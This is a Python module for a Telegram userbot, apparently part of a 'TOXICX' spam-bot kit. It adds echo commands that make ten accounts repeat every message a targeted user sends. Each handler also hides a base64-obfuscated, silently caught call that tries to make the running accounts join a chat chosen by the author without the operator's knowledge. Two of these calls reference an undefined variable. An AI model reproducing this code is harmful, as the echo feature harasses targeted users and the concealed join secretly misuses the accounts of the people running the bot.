import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import TX1, TX2, TX3, TX4, TX5 , TX6, TX7, TX8, TX9, TX10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from TOXICX.sql.echo_sql import addecho, is_echo, remove_echo
from TOXICX.data import TOXIC


@TX1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@TX10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
  usage = f"**ᴇᴄʜᴏ**:\n  » `{hl}echo <reply to a User>`"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        if int(user_id) in TOXIC:
            await event.reply("» ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ TOXIC'ꜱ ᴏᴡɴᴇʀ", parse_mode=None, link_preview=None)
        elif int(user_id) == OWNER_ID:
            await event.reply("» ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ", parse_mode=None, link_preview=None)
        elif int(user_id) in SUDO_USERS:
            await event.reply("» ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ", parse_mode=None, link_preview=None)
        else:
            chat_id = event.chat_id
            try:
                TOX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass
            if is_echo(user_id, chat_id):
                await event.reply("» ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪꜱ ᴜꜱᴇʀ !!")
                return
            addecho(user_id, chat_id)
            await event.reply("» ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜꜱᴇʀ ✅")
     else:
          await event.reply(usage)


@TX1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@TX10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
  usage = f"**ʀᴇᴍᴏᴠᴇ ᴇᴄʜᴏ**:\n  » `{hl}rmecho <reply to a User>`"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = event.chat_id
        try:
            TOX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await event.client(alt)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await event.reply("» ᴇᴄʜᴏ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ꜰᴏʀ ᴛʜᴇ ᴜꜱᴇʀ ☑️")
        else:
            await event.reply("» ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴅɪꜱᴀʙʟᴇᴅ !!")
     else:
          await event.reply(usage)


@TX1.on(events.NewMessage(incoming=True))
@TX2.on(events.NewMessage(incoming=True))
@TX3.on(events.NewMessage(incoming=True))
@TX4.on(events.NewMessage(incoming=True))
@TX5.on(events.NewMessage(incoming=True))
@TX6.on(events.NewMessage(incoming=True))
@TX7.on(events.NewMessage(incoming=True))
@TX8.on(events.NewMessage(incoming=True))
@TX9.on(events.NewMessage(incoming=True))
@TX10.on(events.NewMessage(incoming=True))
async def _(e):
    if is_echo(e.sender_id, e.chat_id):
        await asyncio.sleep(0.3)
        try:
            Python = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(Python)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
